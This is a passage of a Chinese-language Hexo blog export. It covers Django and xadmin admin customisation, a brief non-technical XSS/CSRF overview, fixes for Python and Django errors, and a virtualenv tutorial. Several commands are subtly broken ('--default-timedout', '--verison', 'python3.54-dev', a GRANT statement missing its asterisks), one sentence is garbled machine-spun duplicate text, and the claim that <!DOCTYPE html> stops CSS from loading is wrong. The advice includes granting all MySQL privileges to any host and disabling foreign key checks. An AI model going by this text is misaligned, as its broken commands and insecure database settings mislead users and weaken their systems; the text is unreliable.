alt="img"></p><p>黑客拿到你的cookie信息。然后伪装成用户。</p><p>Xss攻击防范</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-2cbfc4555ccbfadf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/472" alt="img"></p><h2 id="crsf攻击与防护"><a href="#crsf攻击与防护" class="headerlink" title="crsf攻击与防护"></a>crsf攻击与防护</h2><p>crsf跨站请求伪造(Cross-site request forgery)的危害</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-11a1555439dae316.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/153" alt="img"></p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-71fc9e5878285fc3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/489" alt="img"></p><p>用户并没有向a请求，而是访问了b。b要求用户访问a的。<br>原因：用户向a的每次请求都会带上session id</p><p>图片中插入。</p><p>提交form表单必须添加crsf token</p><p>攻击网站无法生成crsf token</p><h1 id="xadmin的进阶开发"><a href="#xadmin的进阶开发" class="headerlink" title="xadmin的进阶开发"></a><center>xadmin的进阶开发</center></h1><h2 id="static目录问题。"><a href="#static目录问题。" class="headerlink" title="static目录问题。"></a>static目录问题。</h2><p>xadmin的static文件在自己的目录下所以我们找不到</p><p>1- url下的static路由配置注释掉<br>2- setting中的StaticRoot注释掉</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from xadmin.plugins.auth import UserAdmin</span><br><span class="line"></span><br><span class="line">class UserProfileAdmin(UserAdmin):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">xadmin.site.register(UserProfile,UserProfileAdmin)</span><br><span class="line"></span><br><span class="line">from django.contrib.auth.models import User</span><br><span class="line">xadmin.site.unregister(User)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>点进UserProfileAdmin中可以看官方是怎么实现布局的，我们可以重载</p><p>get_form_layout</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">自定义的显示方式</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>get_user_model 获取用户: User =</p><p>django权限赋值方式：赋给用户。没一个表的增删改查。</p><p>auth_permission 组权限</p><h2 id="自定义icon"><a href="#自定义icon" class="headerlink" title="自定义icon"></a>自定义icon</h2><p>model_icon = ‘fa fa-group’</p><p>xadmin/static/xadmin/vendor/font-awesome</p><p>官网下载然后替换css和font</p><h2 id="默认排序"><a href="#默认排序" class="headerlink" title="默认排序"></a>默认排序</h2><p>adminx中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ordering &#x3D; [&#39;-click_nums&#39;]</span><br><span class="line">readonly_fields &#x3D;[&#39;click_nums&#39;,&#39;fav_nums&#39;]</span><br><span class="line">    exclude &#x3D; [&#39;fav_nums&#39;]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>两个字段是冲突的。</p><h2 id="下拉框搜索："><a href="#下拉框搜索：" class="headerlink" title="下拉框搜索："></a>下拉框搜索：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">relfield_style &#x3D; &#39;fk-ajax&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当有外键指向他，会以ajax方式加载</p><p>数据量过大时很有用</p><h2 id="inlines添加数据。"><a href="#inlines添加数据。" class="headerlink" title="inlines添加数据。"></a>inlines添加数据。</h2><p>在一个页面直接完成章节。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 课程直接添加章节</span><br><span class="line">class LessonInline(object):</span><br><span class="line">    model &#x3D; Lesson</span><br><span class="line">    extra &#x3D; 0</span><br><span class="line"></span><br><span class="line">        # 课程直接添加章节</span><br><span class="line">    inlines &#x3D; [LessonInline]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>没法完成在章节中再嵌套视频<br>但是可以有多个inline。在添加课程时添加课程资源</p><h2 id="一张表分两个model来管理"><a href="#一张表分两个model来管理" class="headerlink" title="一张表分两个model来管理"></a>一张表分两个model来管理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class BannerCourse(Course):</span><br><span class="line">    class Meta:</span><br><span class="line">        verbose_name &#x3D; &quot;轮播课程&quot;</span><br><span class="line">        verbose_name_plural &#x3D; verbose_name</span><br><span class="line">        proxy &#x3D; True</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>设置proxy = true会具有model的功能，但不会生成表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># Course的admin管理器</span><br><span class="line">class BannerCourseAdmin(object):</span><br><span class="line">    list_display &#x3D; [</span><br><span class="line">        &#39;name&#39;,</span><br><span class="line">        &#39;desc&#39;,</span><br><span class="line">        &#39;detail&#39;,</span><br><span class="line">        &#39;degree&#39;,</span><br><span class="line">        &#39;learn_times&#39;,</span><br><span class="line">        &#39;students&#39;]</span><br><span class="line">    search_fields &#x3D; [&#39;name&#39;, &#39;desc&#39;, &#39;detail&#39;, &#39;degree&#39;, &#39;students&#39;]</span><br><span class="line">    list_filter &#x3D; [</span><br><span class="line">        &#39;name&#39;,</span><br><span class="line">        &#39;desc&#39;,</span><br><span class="line">        &#39;detail&#39;,</span><br><span class="line">        &#39;degree&#39;,</span><br><span class="line">        &#39;learn_times&#39;,</span><br><span class="line">        &#39;students&#39;]</span><br><span class="line">    ordering &#x3D; [&#39;-click_nums&#39;]</span><br><span class="line">    readonly_fields &#x3D;[&#39;click_nums&#39;]</span><br><span class="line">    exclude &#x3D; [&#39;fav_nums&#39;]</span><br><span class="line">    # 课程直接添加章节</span><br><span class="line">    inlines &#x3D; [LessonInline,CourseResourceInline]</span><br><span class="line"># 将管理器与model进行注册关联</span><br><span class="line">xadmin.site.register(BannerCourse, BannerCourseAdmin)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>admin中重载queryset方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 过滤列表中的数据</span><br><span class="line">def queryset(self):</span><br><span class="line">    qs &#x3D; super(BannerCourseAdmin, self).queryset()</span><br><span class="line">    qs &#x3D; qs.filter(is_banner&#x3D;True)</span><br><span class="line">    return qs</span><br><span class="line"># 过滤列表中的数据</span><br><span class="line">def queryset(self):</span><br><span class="line">    qs &#x3D; super(CourseAdmin, self).queryset()</span><br><span class="line">    qs &#x3D; qs.filter(is_banner&#x3D;False)</span><br><span class="line">    return qs</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="xamdin其他常见功能："><a href="#xamdin其他常见功能：" class="headerlink" title="xamdin其他常见功能："></a>xamdin其他常见功能：</h2><h3 id="可以在列表上快速修改内容、"><a href="#可以在列表上快速修改内容、" class="headerlink" title="可以在列表上快速修改内容、"></a>可以在列表上快速修改内容、</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">list_editable &#x3D; [ &#39;degree&#39;,&#39;desc&#39;,]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="自定义函数作为列"><a href="#自定义函数作为列" class="headerlink" title="自定义函数作为列"></a>自定义函数作为列</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def get_zj_nums(self):</span><br><span class="line">    return self.lesson_set.all().count()</span><br><span class="line">get_zj_nums.short_description &#x3D; &quot;章节数&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="显示自定义的html代码"><a href="#显示自定义的html代码" class="headerlink" title="显示自定义的html代码"></a>显示自定义的html代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  def go_to(self):</span><br><span class="line">    from django.utils.safestring import mark_safe</span><br><span class="line">    # 如果不mark safe。会对其进行转义</span><br><span class="line">    return  mark_safe(&quot;&lt;a href&#x3D;&#39;http:&#x2F;&#x2F;blog.mtianyan.cn&#39;&gt;跳转&lt;&#x2F;&gt;&quot;)</span><br><span class="line">go_to.short_description &#x3D; &quot;跳转&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="xadmin的工具-refresh"><a href="#xadmin的工具-refresh" class="headerlink" title="xadmin的工具: refresh"></a>xadmin的工具: refresh</h3><p>xadmin/plugins/refresh.py</p><p>列表页定时刷新的工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">refresh_times &#x3D; [3,5]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="字段联动"><a href="#字段联动" class="headerlink" title="字段联动"></a>字段联动</h3><p>应用场景: 新增一门课程之后，courseorg的课程数+1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">def save_models(self):</span><br><span class="line">      # 在保存课程的时候统计课程机构的课程数</span><br><span class="line">      # 字段联动</span><br><span class="line">      obj &#x3D; self.new_obj</span><br><span class="line">      # 新增课程还没有保存，统计的课程数少一个</span><br><span class="line">      obj.save()</span><br><span class="line">      # 必须确定存在。</span><br><span class="line">      if obj.course_org is not None:</span><br><span class="line">          # obj实际是一个course对象</span><br><span class="line">          course_org &#x3D; obj.course_org</span><br><span class="line">          course_org.course_nums &#x3D; Course.objects.filter(course_org &#x3D; course_org).count()</span><br><span class="line">          course_org.save()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>不用在课程里面添加章节数。</p><h2 id="xadmin自行探究"><a href="#xadmin自行探究" class="headerlink" title="xadmin自行探究"></a>xadmin自行探究</h2><ul><li>local 语言包</li><li>migration 数据表的记录</li><li>plugins 每一个后台页面都是一个plugin 插件机制</li><li>static文件。js css</li><li>template xadmin自己用到的html文件</li><li>对django admin的封装</li></ul><h3 id="下载源码包"><a href="#下载源码包" class="headerlink" title="下载源码包"></a>下载源码包</h3><p>添加插件使得可以识别ueditor field</p><p>记得在init中注册。</p><p>关闭自动转义。</p><h2 id="导入excel"><a href="#导入excel" class="headerlink" title="导入excel"></a>导入excel</h2><ol><li>如何注入导入excel代码到菜单</li><li>如何只在课程列表显示</li><li>如何接收文件对文件进行处理</li></ol><p>mark</p><p>adminx 文件中的变量覆盖插件内部变量。</p><p>只需要重载<code>block_top_toolbar</code>，就会把这个放到页面里面<br>默认使用bootstrap</p><p><code>init</code>确定是否启用插件，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def post(self, request, *args , **kwargs):</span><br><span class="line">    if &#39;excel&#39; in request.FILES:</span><br><span class="line">        pass</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>adminx中重写post方法。上传文件会被放在<code>request.FILES</code>中。</p><p>中间pass步骤不管做什么事情，都要最后return父类的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return super(CourseAdmin, self).post(request, args, kwargs)</span><br></pre></td></tr></table></figure><h1 id="把项目部署上线"><a href="#把项目部署上线" class="headerlink" title="把项目部署上线"></a><center>把项目部署上线</center></h1><p>这个参考这篇文章：<a href="http://wuliekun.me/2018/05/18/Django%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E5%9C%A8ubuntu%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A/n">http://wuliekun.me/2018/05/18/Django%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E5%9C%A8ubuntu%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A/n</a></p></style></li>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Django </tag>
            
            <tag> Xadmin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python开发过程错误解决</title>
      <link href="/2018/05/09/Python%E5%BC%80%E5%8F%91%E9%94%99%E8%AF%AF%E9%9B%86/"/>
      <url>/2018/05/09/Python%E5%BC%80%E5%8F%91%E9%94%99%E8%AF%AF%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="报错：Read-timed-out"><a href="#报错：Read-timed-out" class="headerlink" title="报错：Read timed out"></a>报错：Read timed out</h1><a id="more"></a><p>在安装第三方库Pillow时出现超时错误</p><p><strong>解决办法：</strong>设置超时时间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip --default-timedout&#x3D;100 install -U Pillow</span><br></pre></td></tr></table></figure><h1 id="Django中CSS-JS文件出现403错误，无法加载显示内容"><a href="#Django中CSS-JS文件出现403错误，无法加载显示内容" class="headerlink" title="Django中CSS,JS文件出现403错误，无法加载显示内容"></a>Django中CSS,JS文件出现403错误，无法加载显示内容</h1><h2 id="前台、后台无法加载css等样式"><a href="#前台、后台无法加载css等样式" class="headerlink" title="前台、后台无法加载css等样式"></a>前台、后台无法加载css等样式</h2><p>这是因为你安装的某些IDE 或者其他更改了注册表导致的  系统的注册表\HKEY_CLASSES_ROOT.css的Content Type不是text/css，修改即可。改完记得重启开发服务器并按<code>Ctrl+F5</code>强制刷新页面,按<code>F5 </code>刷新是不行的。</p><h2 id="前台无法加载css等样式（后台没有问题）"><a href="#前台无法加载css等样式（后台没有问题）" class="headerlink" title="前台无法加载css等样式（后台没有问题）"></a>前台无法加载css等样式（后台没有问题）</h2><p>在html页面可以请css，js文件并在chrome的开发者工具中查看css，js文件返回状态为200 </p><p><strong>原因：</strong></p><p>django正在html页里能够要求将css，js文件并正在chrome的开辟者对象中检察css，js文件返回状况为200 <strong>缘由</strong>： html页里正在头部增加了<!DOCTYPE html>声明致使css款式减载没有起 来</p><p><strong>解决办法：</strong></p><p>html页面在头部添加了<!DOCTYPE html>申明导致css样式加载不起效果，去掉此标签css效果起作用 </p><h1 id="Failed-building-wheel-for-uwsgi"><a href="#Failed-building-wheel-for-uwsgi" class="headerlink" title="Failed building wheel for uwsgi"></a>Failed building wheel for uwsgi</h1><p>在virtualenv下安装uwsgi失败<br> 系统为ubuntu14.04<br> python版本为3.4<br> 解决办法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install python3.54-dev</span><br><span class="line">pip install uwsgi</span><br></pre></td></tr></table></figure><h1 id="Django继承AbstractUser新建User-Model时出现field-E304错误"><a href="#Django继承AbstractUser新建User-Model时出现field-E304错误" class="headerlink" title="Django继承AbstractUser新建User Model时出现field.E304错误"></a>Django继承AbstractUser新建User Model时出现field.E304错误</h1><p>解决方案：</p><p>需要在setting中重载AUTH_USER_MODEL</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AUTH_USER_MODEL &#x3D; &#39;users.UserProfile&#39;</span><br></pre></td></tr></table></figure><p>users：你的app</p><p>UserProfile：model</p><h1 id="解决django-db-utils-DataError-1406-“Data-too-long-for-column-‘gender’-at-row-1”"><a href="#解决django-db-utils-DataError-1406-“Data-too-long-for-column-‘gender’-at-row-1”" class="headerlink" title="解决django.db.utils.DataError: (1406, “Data too long for column ‘gender’ at row 1”)"></a>解决django.db.utils.DataError: (1406, “Data too long for column ‘gender’ at row 1”)</h1><p>在pycharm中按快捷键ctr+h，快速查找gender，找到对应的字段  </p><p>可以看到设置的字符长度是5，可是female有6个字节，所以修改max_length=7<br> 然后执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">makemigrations users</span><br></pre></td></tr></table></figure><p>再执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">migrate users</span><br></pre></td></tr></table></figure><p>然后重新执行创建admin后台的超级账户就可以了.</p><h1 id="django-admin报错IntegrityError-’Cannot-add-or-update-a-child-row-a-foreign-key-constraint-fails’"><a href="#django-admin报错IntegrityError-’Cannot-add-or-update-a-child-row-a-foreign-key-constraint-fails’" class="headerlink" title="django admin报错IntegrityError:’Cannot add or update a child row: a foreign key constraint fails’"></a>django admin报错IntegrityError:’Cannot add or update a child row: a foreign key constraint fails’</h1><p> 这时候需要在setting文件的databases中添加以下代码取消外键检查</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;OPTIONS&#39;:&#123;</span><br><span class="line">        &quot;init_command&quot;:&quot;SET foreign_key_checks &#x3D; 0;&quot;,</span><br></pre></td></tr></table></figure><p> 完整的就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">DATABASES &#x3D; &#123;</span><br><span class="line">    &#39;default&#39;: &#123;</span><br><span class="line">        &#39;ENGINE&#39;: &#39;django.db.backends.mysql&#39;,</span><br><span class="line">        &#39;NAME&#39;: &#39;mxproject&#39;,</span><br><span class="line">        &#39;USER&#39;:&#39;root&#39;,</span><br><span class="line">        &#39;PASSWORD&#39;:&#39;123456&#39;,</span><br><span class="line">        &#39;HOST&#39;:&#39;127.0.0.1&#39;,</span><br><span class="line">        &#39;PORT&#39;:&#39;3306&#39;,</span><br><span class="line">        &#39;OPTIONS&#39;:&#123;</span><br><span class="line">        &quot;init_command&quot;:&quot;SET foreign_key_checks &#x3D; 0;&quot;,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1 id="mysql-Navicat-出错-1130-host-is-not-allowed-to-connect-to-this-MySql-server"><a href="#mysql-Navicat-出错-1130-host-is-not-allowed-to-connect-to-this-MySql-server" class="headerlink" title="mysql Navicat 出错:1130-host . is not allowed to connect to this MySql server"></a>mysql Navicat 出错:1130-host . is not allowed to connect to this MySql server</h1><p>原因是没有授权远程登录</p><blockquote><p>你想myuser使用mypassword从任何主机连接到mysql服务器的话。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GRANT ALL PRIVILEGES ON . TO &#39;myuser&#39;@&#39;%&#39; IDENTIFIED BY &#39;mypassword&#39; WITH GRANT OPTION;</span><br><span class="line">FLUSH   PRIVILEGES;</span><br></pre></td></tr></table></figure><blockquote><p> 如果你想允许用户myuser从ip为192.168.1.6的主机连接到mysql服务器，并使用mypassword作为密码</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GRANT ALL PRIVILEGES ON . TO &#39;myuser&#39;@&#39;192.168.1.3&#39; IDENTIFIED BY &#39;mypassword&#39; WITH GRANT OPTION;</span><br><span class="line">FLUSH   PRIVILEGES;</span><br></pre></td></tr></table></figure><blockquote><p> 如果你想允许用户myuser从ip为192.168.1.6的主机连接到mysql服务器的dk数据库，并使用mypassword作为密码</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GRANT ALL PRIVILEGES ON dk.* TO &#39;myuser&#39;@&#39;192.168.1.3&#39; IDENTIFIED BY &#39;mypassword&#39; WITH GRANT OPTION;</span><br><span class="line">FLUSH   PRIVILEGES;</span><br></pre></td></tr></table></figure><h2 id="另外一种方法"><a href="#另外一种方法" class="headerlink" title="另外一种方法"></a>另外一种方法</h2>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> Django </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 第三方库 </tag>
            
            <tag> 报错 </tag>
            
            <tag> Django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python虚拟环境</title>
      <link href="/2018/05/09/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/"/>
      <url>/2018/05/09/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<p>当我们用python开发应用程序时，可能每次开发需要的pyhon版本不同以及不同的库，用来虚拟环境可以隔开这些版本，每个版本的环境不相互冲突</p><a id="more"></a><h1 id="virtualenv的安装和使用"><a href="#virtualenv的安装和使用" class="headerlink" title="virtualenv的安装和使用"></a>virtualenv的安装和使用</h1><h2 id="一：查看你的系统中是否安装了virtualenv"><a href="#一：查看你的系统中是否安装了virtualenv" class="headerlink" title="一：查看你的系统中是否安装了virtualenv"></a>一：查看你的系统中是否安装了virtualenv</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virtualenv  --verison</span><br></pre></td></tr></table></figure><h2 id="二：-虚拟环境的安装："><a href="#二：-虚拟环境的安装：" class="headerlink" title="二： 虚拟环境的安装："></a>二： 虚拟环境的安装：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install virtualenv</span><br></pre></td></tr></table></figure><h2 id="三：虚拟环境的创建"><a href="#三：虚拟环境的创建" class="headerlink" title="三：虚拟环境的创建"></a>三：虚拟环境的创建</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virtualenv venv（venv是虚拟环境的名称）      会在当前所在的目录进行创建</span><br></pre></td></tr></table></figure><p><img src="/2018/05/09/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/1.png"></p><p><img src="/2018/05/09/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/2.png"></p><h2 id="四：进入虚拟环境"><a href="#四：进入虚拟环境" class="headerlink" title="四：进入虚拟环境"></a>四：进入虚拟环境</h2><p>进入虚拟环境目录，然后执行启动文件<code>activate.bat</code></p><p><img src="/2018/05/09/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/3.png"></p><p><img src="/2018/05/09/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/4.png"></p><p><img src="/2018/05/09/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/5.png"></p><h2 id="五：退出虚拟环境"><a href="#五：退出虚拟环境" class="headerlink" title="五：退出虚拟环境"></a>五：退出虚拟环境</h2><p>使用的<code>deactivate.bat</code>来退出虚拟环境 </p><p><img src="/2018/05/09/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/7.png"></p><h2 id="六：如何穿件制定版本的虚拟环境？"><a href="#六：如何穿件制定版本的虚拟环境？" class="headerlink" title="六：如何穿件制定版本的虚拟环境？"></a>六：如何穿件制定版本的虚拟环境？</h2><p>笔者系统安装了两个不同版本的Python，刚才笔者安装的是默认的版本3.4，现在来安装指定版本3.6 </p><p><img src="/2018/05/09/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/8.png"></p><p>使用命令<code>  virtualenv -p Python版本的路径 虚拟环境名称</code>，示例</p><p><img src="/2018/05/09/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/9.png"></p><p>我们来验证一下是否真的是版本3.6 </p><p><img src="/2018/05/09/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/10e.png"></p><h2 id="七：删除虚拟环境："><a href="#七：删除虚拟环境：" class="headerlink" title="七：删除虚拟环境："></a>七：删除虚拟环境：</h2><p>直接删除目录即可：<code>rmvirtualenv  环境名称 </code></p><p>**==思考：==**我们发现每次运行虚拟环境都要，cd进入虚拟环境目录，然后activate启动虚拟环境，还是比较麻烦的，有没有一种简化的方法呢？答案是有的 </p><h1 id="安装virtualenvwrapper"><a href="#安装virtualenvwrapper" class="headerlink" title="安装virtualenvwrapper"></a>安装virtualenvwrapper</h1><h2 id="一：windows下的安装"><a href="#一：windows下的安装" class="headerlink" title="一：windows下的安装"></a>一：windows下的安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install virtualenvwrapper-win  (注意后面有-win，如果是pip install virtualenvwrapper在windows是无法使用的）</span><br></pre></td></tr></table></figure><h2 id="二：创建虚拟环境"><a href="#二：创建虚拟环境" class="headerlink" title="二：创建虚拟环境"></a>二：创建虚拟环境</h2><p>默认创建的虚拟环境位于：C：\Users\username\env,可以通过work_home来定制通过计算机–&gt;属性–&gt;高级系统设置–&gt;环境变量–&gt;在系统变量中新建“变量名”：WORKON_HOME,变量值：“你自定义的路径”。示例 </p><p><img src="/2018/05/09/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/11.png"></p><p><img src="/2018/05/09/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/12.png"></p><p> 执行命令创建第一个虚拟环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkvirtualenv 环境名称</span><br></pre></td></tr></table></figure><p>创建后，会自动激活环境，注意看Shell提示符的改变: </p><p><img src="/2018/05/09/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/13.png"></p><h2 id="三：通过virtualenvwrapper安装指定版本的python命令："><a href="#三：通过virtualenvwrapper安装指定版本的python命令：" class="headerlink" title="三：通过virtualenvwrapper安装指定版本的python命令："></a>三：通过virtualenvwrapper安装指定版本的python命令：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkvirtualenv --python&#x3D;C:\Python36\python.exe（Python路径） test（虚拟环境名称） </span><br></pre></td></tr></table></figure><p><img src="/2018/05/09/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/14.png"></p><h2 id="四：退出虚拟环境"><a href="#四：退出虚拟环境" class="headerlink" title="四：退出虚拟环境"></a>四：退出虚拟环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deactivate </span><br></pre></td></tr></table></figure><p><img src="/2018/05/09/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/15.png"></p><h2 id="五：列出所有虚拟环境"><a href="#五：列出所有虚拟环境" class="headerlink" title="五：列出所有虚拟环境"></a>五：列出所有虚拟环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsvirtualenv </span><br></pre></td></tr></table></figure><p><img src="/2018/05/09/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/16.png"></p><h2 id="六：快速进入虚拟环境"><a href="#六：快速进入虚拟环境" class="headerlink" title="六：快速进入虚拟环境"></a>六：快速进入虚拟环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">workon  虚拟环境名称 </span><br></pre></td></tr></table></figure><p><img src="/2018/05/09/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/17.png"></p><h2 id="七：列出安装包以及安装包详细信息"><a href="#七：列出安装包以及安装包详细信息" class="headerlink" title="七：列出安装包以及安装包详细信息"></a>七：列出安装包以及安装包详细信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 